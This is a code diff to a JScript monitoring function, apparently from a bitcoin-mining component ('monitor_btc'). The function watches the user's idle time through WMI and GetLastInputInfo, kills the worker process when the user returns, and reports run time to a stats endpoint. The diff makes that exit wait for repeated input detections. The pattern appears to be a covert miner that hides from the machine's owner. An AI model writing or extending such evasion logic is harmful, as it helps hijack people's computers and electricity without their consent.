@@ -111,12 +111,17 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 		return ;
 	}
 	var wql = "SELECT * FROM Win32_Process" + " where ProcessID=" + pid	
+	var idleCount=0;
 	var timer1 = setInterval(function(){ //每秒一次idle 有输入即退出
 		var process = new Enumerator (__service.ExecQuery(wql)).item();	
 		if( process){	
 			var idle = __external.GetTickCount()-__external.GetLastInputInfo()
 			//idle=-1;
-			if(idle >0 && idle < 1500){ //主动出口			
+			if(idle >0 && idle < 1500){ //主动出口，连续两次idle<1500
+				log("idleCount : " + idleCount);
+				if(idleCount++<2){//主动出口，连续两次idle<1500
+					return;
+				}			
 				clearInterval(timer1)
 				log("kill exit idle="+idle+" , pid="+pid+" , __external.GetLastInputInfo()="+__external.GetLastInputInfo()+", __external.GetTickCount()="+__external.GetTickCount());					
 				var PAGE_READWRITE = 4;
@@ -136,7 +141,11 @@ function filter_sebtc.prototype.monitorCPUandInput(pipe){
 				sendHttpStat("monitor_btc", "kill_exit", si * parseInt((__external.GetTickCount()-starttime)/1000/60),1);
 				pThis.callback(pipe)
 				return ;
-			}	
+			}
+			else{
+				if(0 != idleCount)
+					idleCount = 0;
+			}			
 			if(__DEBUG){
 				var PAGE_READWRITE = 4;
 				var h = __storage.OpenFileMapping( PAGE_READWRITE, 0,"rpcxx_speed");
